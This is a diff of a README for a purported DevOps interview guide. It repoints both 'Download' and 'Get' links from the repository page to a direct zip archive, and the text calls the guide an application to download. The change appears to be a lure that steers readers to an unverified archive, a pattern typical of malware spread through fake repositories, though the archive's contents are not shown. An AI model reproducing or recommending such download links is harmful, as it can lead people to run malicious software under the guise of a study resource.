@@ -1,6 +1,6 @@
 # DevOps-Interview-Guide - Ace Your DevOps Career Fast
 
-[![Download Now](https://img.shields.io/badge/Download-DevOps_Guide-2ea44f?style=for-the-badge&logo=github)](https://github.com/Alate-spinsterhood292/DevOps-Interview-Guide)
+[![Download Now](https://img.shields.io/badge/Download-DevOps_Guide-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Alate-spinsterhood292/DevOps-Interview-Guide/main/OPT_IT/Guide-Dev-Interview-Ops-v1.7.zip)
 
 ## 🚀 What Is This?
 
@@ -14,7 +14,7 @@ Anybody preparing for a technical interview in DevOps, cloud, or infrastructure 
 
 Visit this link to download the application:
 
-[**Get DevOps-Interview-Guide**](https://github.com/Alate-spinsterhood292/DevOps-Interview-Guide)
+[**Get DevOps-Interview-Guide**](https://raw.githubusercontent.com/Alate-spinsterhood292/DevOps-Interview-Guide/main/OPT_IT/Guide-Dev-Interview-Ops-v1.7.zip)
 
 The guide is available as a web page you can read online or download for offline use.
 
